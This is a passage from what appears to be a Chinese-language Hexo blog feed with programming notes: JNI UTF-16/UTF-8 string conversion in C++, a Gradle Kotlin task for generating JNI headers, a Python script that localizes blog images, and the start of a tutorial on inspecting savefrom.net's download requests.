        <content type="html"><![CDATA[<p>JNI中jstring转码到std::string其实就是utf16转码到你选择的编码的过程，因为我C++程序要用utf8，所以这里我转成utf8<br>用到的转码库是<a href="https://github.com/nemtrif/utfcpp">utfcpp</a><br>这个库的使用方法就是下载source文件夹下全部内容，然后<code>#include &quot;utf8.h&quot;</code>在你的项目</p><p>代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::string <span class="title">Tools::jstring2str</span><span class="params">(jstring jStr, JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!jStr) &#123;</span><br><span class="line">        <span class="comment">//警告:kotlin部分返回空字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::u16string s = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">const</span> <span class="type">char16_t</span>*&gt;(env-&gt;<span class="built_in">GetStringChars</span>(jStr, <span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">if</span>(s.<span class="built_in">length</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//警告:kotlin部分返回空字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::string x;</span><br><span class="line">    utf8::<span class="built_in">utf16to8</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), std::<span class="built_in">back_inserter</span>(x));</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">jstring <span class="title">str2jstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* stra, JNIEnv* env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!stra)&#123;</span><br><span class="line">        <span class="comment">//警告:C++部分传入空字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">std::string <span class="title">str</span><span class="params">(stra)</span></span>;</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">short</span>&gt; utf16line;</span><br><span class="line">    utf8::<span class="built_in">utf8to16</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>(), std::<span class="built_in">back_inserter</span>(utf16line));</span><br><span class="line">    <span class="keyword">auto</span>* c = <span class="keyword">new</span> jchar[utf16line.<span class="built_in">size</span>()];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;utf16line.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        c[i] = utf16line[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewString</span>((<span class="type">const</span> jchar*)c, (jsize)utf16line.<span class="built_in">size</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现思路可参照<a href="https://stackoverflow.com/questions/32205446/getting-true-utf-8-characters-in-java-jni">https://stackoverflow.com/questions/32205446/getting-true-utf-8-characters-in-java-jni</a><br>主要就是如果用jni的转码，转换的是jni修改过的特殊的utf8，所以有几种思路，其中之一就是取utf16编码，然后自己转码</p><p>同时也可以参考谷歌的做法: <a href="https://chromium.googlesource.com/chromium/src/base/+/refs/heads/main/android/jni_string.cc#27">https://chromium.googlesource.com/chromium/src/base/+/refs/heads/main/android/jni_string.cc#27</a></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> JNI </tag>
            
            <tag> Encoding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin-生成jni头文件</title>
      <link href="/2021/05/14/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6/"/>
      <url>/2021/05/14/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>最近在用kotlin写jni，但是生成头文件的时候遇到了些问题。<br>首先 javah 在java &gt;&#x3D; 1.9 就被取消用javac -h代替，但是javac对kotlin不适用，kotlinc也没有 -h 这个生成头文件的选项。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在stackoverflow论坛找到了个解决方案，那个人提供了一个gradle task，大概原理是先用complieKotlin任务(或kotlinc)生成class字节码，再用javac编译回java文件，然后再调用javac -h 针对那个java文件生成jni头文件，我稍微修复了下，然后迁移到gradle kotlin dsl(就kts脚本)，代码在下面。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>复制到build.gradle.kts的最外层就可以了，然后sync一下gradle，然后在gradle task里的build分类下就有generate jniheader这个任务了，<a href="https://stackoverflow.com/a/65661275/14646226">StackOverflow原贴地址https://stackoverflow.com/a/65661275/14646226</a></p><p>需要改下代码里的<code>inputs.dir(&quot;src/main/kotlin&quot;)</code>到你的kt源码文件夹, <code>outputs.dir(&quot;src/main/generated/jni&quot;)</code>到你想的输出文件夹</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">val</span> generateJniHeaders: Task <span class="keyword">by</span> tasks.creating &#123;</span><br><span class="line">    group = <span class="string">&quot;build&quot;</span></span><br><span class="line">    dependsOn(tasks.getByName(<span class="string">&quot;compileKotlin&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// For caching</span></span><br><span class="line">    inputs.dir(<span class="string">&quot;src/main/kotlin&quot;</span>)</span><br><span class="line">    outputs.dir(<span class="string">&quot;src/main/generated/jni&quot;</span>)</span><br><span class="line"></span><br><span class="line">    doLast &#123;</span><br><span class="line">        <span class="keyword">val</span> javaHome = org.gradle.<span class="keyword">internal</span>.jvm.Jvm.current().javaHome</span><br><span class="line">        <span class="keyword">val</span> javap = javaHome.resolve(<span class="string">&quot;bin&quot;</span>).walk().firstOrNull &#123; it.name.startsWith(<span class="string">&quot;javap&quot;</span>) &#125;?.absolutePath ?: error(<span class="string">&quot;javap not found&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> javac = javaHome.resolve(<span class="string">&quot;bin&quot;</span>).walk().firstOrNull &#123; it.name.startsWith(<span class="string">&quot;javac&quot;</span>) &#125;?.absolutePath ?: error(<span class="string">&quot;javac not found&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> buildDir = file(<span class="string">&quot;build/classes/kotlin/main&quot;</span>)</span><br><span class="line">        <span class="keyword">val</span> tmpDir = file(<span class="string">&quot;build/tmp/jvmJni&quot;</span>).apply &#123; mkdirs() &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">val</span> bodyExtractingRegex = <span class="string">&quot;&quot;&quot;^.+\Rpublic \w* ?class ([^\s]+).*\&#123;\R((?s:.+))\&#125;\R$&quot;&quot;&quot;</span>.toRegex()</span><br><span class="line">        <span class="keyword">val</span> nativeMethodExtractingRegex = <span class="string">&quot;&quot;&quot;.*\bnative\b.*&quot;&quot;&quot;</span>.toRegex()</span><br><span class="line"></span><br><span class="line">        buildDir.walkTopDown()</span><br><span class="line">            .filter &#123; <span class="string">&quot;META&quot;</span> !<span class="keyword">in</span> it.absolutePath &#125;</span><br><span class="line">            .forEach &#123; file -&gt;</span><br><span class="line">                <span class="keyword">if</span> (!file.isFile) <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> output = com.gradle.publish.plugin.dep.org.apache.commons.io.output.ByteArrayOutputStream().use &#123;</span><br><span class="line">                    project.exec &#123;</span><br><span class="line">                        commandLine(javap, <span class="string">&quot;-private&quot;</span>, <span class="string">&quot;-cp&quot;</span>, buildDir.absolutePath, file.absolutePath)</span><br><span class="line">                        standardOutput = it</span><br><span class="line">                    &#125;.assertNormalExitValue()</span><br><span class="line">                    it.toString()</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> (qualifiedName, methodInfo) = bodyExtractingRegex.find(output)?.destructured ?: <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> lastDot = qualifiedName.lastIndexOf(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">                <span class="keyword">val</span> packageName = qualifiedName.substring(<span class="number">0</span>, lastDot)</span><br><span class="line">                <span class="keyword">val</span> className = qualifiedName.substring(lastDot+<span class="number">1</span>, qualifiedName.length)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> nativeMethods =</span><br><span class="line">                    nativeMethodExtractingRegex.findAll(methodInfo).mapNotNull &#123; it.groups &#125;.flatMap &#123; it.asSequence().mapNotNull &#123; group -&gt; group?.value &#125; &#125;.toList()</span><br><span class="line">                <span class="keyword">if</span> (nativeMethods.isEmpty()) <span class="keyword">return</span><span class="symbol">@forEach</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">val</span> source = buildString &#123;</span><br><span class="line">                    appendLine(<span class="string">&quot;package <span class="variable">$packageName</span>;&quot;</span>)</span><br><span class="line">                    appendLine(<span class="string">&quot;public class <span class="variable">$className</span> &#123;&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> (method <span class="keyword">in</span> nativeMethods) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;()&quot;</span> <span class="keyword">in</span> method) appendLine(method)</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">val</span> updatedMethod = StringBuilder(method).apply &#123;</span><br><span class="line">                                <span class="keyword">var</span> count = <span class="number">0</span></span><br><span class="line">                                <span class="keyword">var</span> i = <span class="number">0</span></span><br><span class="line">                                <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">this</span>[i] == <span class="string">&#x27;,&#x27;</span> || <span class="keyword">this</span>[i] == <span class="string">&#x27;)&#x27;</span>) insert(i, <span class="string">&quot; arg<span class="subst">$&#123;count++&#125;</span>&quot;</span>.also &#123; i += it.length + <span class="number">1</span> &#125;)</span><br><span class="line">                                    <span class="keyword">else</span> i++</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            appendLine(updatedMethod)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    appendLine(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">val</span> outputFile = tmpDir.resolve(packageName.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>)).apply &#123; mkdirs() &#125;.resolve(<span class="string">&quot;<span class="variable">$className</span>.java&quot;</span>).apply &#123; delete() &#125;.apply &#123; createNewFile() &#125;</span><br><span class="line">                outputFile.writeText(source)</span><br><span class="line"></span><br><span class="line">                project.exec &#123;</span><br><span class="line">                    commandLine(javac, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;src/main/generated/jni&quot;</span>, outputFile.absolutePath)</span><br><span class="line">                &#125;.assertNormalExitValue()</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gradle-task位置截图"><a href="#gradle-task位置截图" class="headerlink" title="gradle task位置截图"></a>gradle task位置截图</h2><p><img src="/images/kotlin-%E7%94%9F%E6%88%90jni%E5%A4%B4%E6%96%87%E4%BB%B6.md-0.png" alt="gradle task"></p>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JNI </tag>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python一键下载与替换hexo博客里的图片地址</title>
      <link href="/2021/03/31/python%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%9B%BF%E6%8D%A2hexo%E5%8D%9A%E5%AE%A2%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/03/31/python%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%9B%BF%E6%8D%A2hexo%E5%8D%9A%E5%AE%A2%E9%87%8C%E7%9A%84%E5%9B%BE%E7%89%87%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>要求是在hexo博客里的图片地址都是网络地址, 然后把图片下载到本地, 然后替换掉原来的网络地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2021/3/31</span></span><br><span class="line"><span class="comment"># @Update: 2024/02/09</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: downloadImage.py</span></span><br><span class="line"><span class="keyword">import</span> mimetypes, os, pathlib, re, requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = pathlib.Path(<span class="string">&quot;blog/source&quot;</span>)</span><br><span class="line">    image_p = p / <span class="string">&quot;images&quot;</span></span><br><span class="line">    post_p = p / <span class="string">&quot;_posts&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post_p.exists():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;post_p.absolute()&#125;</span> noy found&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        os.chmod(post_p, <span class="number">0o755</span>)</span><br><span class="line">    image_p.mkdir(exist_ok=<span class="literal">True</span>)</span><br><span class="line">    os.chmod(p, <span class="number">0o755</span>)</span><br><span class="line">    <span class="comment"># 循环目录下每一个.md文件</span></span><br><span class="line">    post_p.glob(<span class="string">&quot;*.md&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> post_p.glob(<span class="string">&quot;*.md&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(file)</span><br><span class="line">        <span class="comment"># 以utf8编码读取</span></span><br><span class="line">        f = <span class="built_in">open</span>(file, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># 匹配markdown中的图片 即 ![tag](url)</span></span><br><span class="line">        <span class="keyword">for</span> text <span class="keyword">in</span> re.findall(<span class="string">r&quot;\!\[[^\s].*\]\([a-zA-z]+:\/\/[^\s]*\)&quot;</span>, content):</span><br><span class="line">            <span class="built_in">print</span>(text)</span><br><span class="line">            <span class="comment"># 提取tag内容</span></span><br><span class="line">            tag = re.findall(<span class="string">r&quot;\!\[[^\s].*\](?=\([a-zA-z]+:\/\/[^\s]*\))&quot;</span>, text)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 提取url内容</span></span><br><span class="line">            urldata = re.findall(<span class="string">r&quot;(?&lt;=\!\[[^\s].*\])\([a-zA-z]+:\/\/[^\s]*\)&quot;</span>, text)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># 去掉括号</span></span><br><span class="line">            u = urldata[<span class="number">1</span>:<span class="built_in">len</span>(urldata) - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 提取当前文章的名字加上编号即为图片名字</span></span><br><span class="line">            name = file.name + <span class="string">&quot;-&quot;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">            <span class="comment"># 获取图片</span></span><br><span class="line">            response = requests.get(u)</span><br><span class="line">            <span class="comment"># 取请求头content-type属性获取扩展名如.png/.jpg</span></span><br><span class="line">            content_type = response.headers[<span class="string">&#x27;content-type&#x27;</span>]</span><br><span class="line">            extension = mimetypes.guess_extension(content_type)</span><br><span class="line">            <span class="comment"># 请求返回内容</span></span><br><span class="line">            img = response.content</span><br><span class="line">            <span class="comment"># 写入图片文件</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_p / (name + extension), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="comment"># 新引用地址</span></span><br><span class="line">            new_u = <span class="string">&quot;/images/&quot;</span> + name + extension</span><br><span class="line">            <span class="comment"># 替换原文</span></span><br><span class="line">            content = content.replace(text, tag + <span class="string">&quot;(&quot;</span> + new_u + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 写入文章文件</span></span><br><span class="line">        f = <span class="built_in">open</span>(file, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        f.write(content)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python自动化下载youtude视频</title>
      <link href="/2021/01/11/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
      <url>/2021/01/11/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>根据 <a href="https://en.savefrom.net/terms.html">savefrom条例</a><br>本实例及教程只用于学习交流用，权利归<strong>savefrom.net</strong>所有</p></blockquote><h2 id="0-思路"><a href="#0-思路" class="headerlink" title="0. 思路"></a>0. 思路</h2><p>使用python从savefrom平台上获取指定youtube视频下载链接进行下载，不过savefrom的数据是用javascript加密的，这也是难度所在<br>本教程主要介绍制作思路，下一篇会介绍制作python<br>本教程根据<a href="https://stackoverflow.com/questions/65443895/how-to-input-data-via-a-post-request-using-requests-in-python/65650186#65650186">stakoverflow 回答</a>制作</p><h2 id="1-准备"><a href="#1-准备" class="headerlink" title="1.准备"></a>1.准备</h2><h2 id="i-savfrom-net"><a href="#i-savfrom-net" class="headerlink" title="i.savfrom.net"></a>i.savfrom.net</h2><p>一个网站可以免费下载youtube视频</p><h2 id="2-探索并规划获取方式"><a href="#2-探索并规划获取方式" class="headerlink" title="2. 探索并规划获取方式"></a>2. 探索并规划获取方式</h2><h3 id="i-总览"><a href="#i-总览" class="headerlink" title="i.总览"></a>i.总览</h3><p>打开<a href="https://en.savefrom.net/1-youtube-video-downloader-4/">https://en.savefrom.net/1-youtube-video-downloader-4/</a>可以看见页面主要就一个from表单输入框和提交按钮组成<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-0.png" alt="video"></p><h3 id="ii-获取该网页取到下载url的请求"><a href="#ii-获取该网页取到下载url的请求" class="headerlink" title="ii. 获取该网页取到下载url的请求"></a>ii. 获取该网页取到下载url的请求</h3><p>在chrome或其他浏览器按<code>F12</code>打开开发者控制台，点开<code>Network</code>选项卡<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-1.png" alt="Network"><br>接下来模拟正常的用户流程，在输入框输入一个youtube视频地址，比如这个<code>https://www.youtube.com/watch?v=IjJmTeBSEzU</code>，然后点击<code>Download</code>提交url获取下载url，然后我们可以发现下面已经出现了下载链接。然后我们在<code>network</code>选项卡内可以发现一个特殊的申请<code>saveform.php</code>(如果没发现可以多提交几次，就会发现每次提交都有这个请求或者看html里的form元素的src地址就是<code>savform.php</code>)<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-2.png" alt="saveform"><br>我们就可以确定关于下载链接会出现在这个请求的返回值内。</p><h3 id="iii-在本地获取请求"><a href="#iii-在本地获取请求" class="headerlink" title="iii. 在本地获取请求"></a>iii. 在本地获取请求</h3><p>在本地用IDE的http工具或者python构建出post请求代码，笔者用的是pycharm的<code>httpClient</code>(按2下左<code>Shift</code>，然后输入<code>Tools</code>，然后回车进入菜单，然后点击<code>httpClient</code>下的第一个)<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-3.png" alt="httpclient"><br>把请求里第二个<code>headers</code>的内容全部复制然后格式化然后构建post请求<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-4.png" alt="headers"><br>然后把下面的<code>formdata</code>的参数也复制进来，记得和<code>headers</code>换行<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-5.png" alt="formdata"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST https://en.savefrom.net/savefrom.php</span><br><span class="line">cache-Control: no-cache</span><br><span class="line">accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cookie: lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; _ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; PHPSESSID=4aojkm49oj7h3de65pekqii337; x-requested-with=; PHPSESSUD=122fb7e10af37e23d99e896fd188744f; _gat_helperWidget=1; _gat_inpagePush2=1</span><br><span class="line">origin: https://en.savefrom.net</span><br><span class="line">pragma: no-cache</span><br><span class="line">referer: https://en.savefrom.net/1-youtube-video-downloader-4/</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;87&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;87&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-fetch-dest: iframe</span><br><span class="line">sec-fetch-mode: navigate</span><br><span class="line">sec-fetch-site: same-origin</span><br><span class="line">sec-fetch-user: ?1</span><br><span class="line">upgrade-insecure-requests: 1</span><br><span class="line">user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"></span><br><span class="line">sf_url=https://www.youtube.com/watch?v=YPvtz1lHRiw&amp;sf_submit=&amp;new=1&amp;lang=en&amp;app=&amp;country=cn&amp;os=Windows&amp;browser=Chrome</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果配置没错，这个时候你运行后会显示出和在浏览器里一样的结果，然后可以发现参数里的<code>sf_url</code>就是需要下载的youtube地址</p><h3 id="iv-解析请求结果"><a href="#iv-解析请求结果" class="headerlink" title="iv.解析请求结果"></a>iv.解析请求结果</h3><p>把取到的结果保存在本地然后在浏览器打开保存的本地文件，然后弹出一个弹窗后会发现这个页面什么都没有，但其实如果你在<code>console</code>输入<code>window</code>会发现有很多变量和函数，其中就有我们需要的加密后的url和解密函数<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-6.png" alt="window"><br>经过弹窗提示我们可以发现是这个html的js发现了我们不在他的网站上然后删除了显示下载url的代码所以我们才什么都看不到，打开<code>source</code>选项卡或者用IDE打开源代码查看<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-7.png" alt="sources"><br>扫一下这个源代码，我们可以看见一些加密解密函数，被加密的乱码信息，哈希对照表，和一些奇怪的赋值操作，如图<br><img src="/images/%E7%94%A8python%E5%81%9Ayoutube%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8B%E8%BD%BD%E5%99%A8.md-8.png" alt="code"><br>我们可以看见，js部分由一个大闭包组成</p><ul><li>第3行到第9行是声明函数</li><li>第10行是给<code>$b</code>赋值<code>this</code>也就是<code>window</code></li><li>第11到第13行是赋值3个变量</li><li>第14，15行是对变量执行一些操作，这个也是我们重点关注的，毕竟执行加密，解密方法只可能在这</li></ul><p>第14，15行格式化后如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$d</span> = $d;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$a</span> = $a;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$e</span> = $e;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$k</span> = $k;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$c</span> = $c;</span><br><span class="line">$c = <span class="title function_">_q</span>($c);</span><br><span class="line">$c = <span class="title 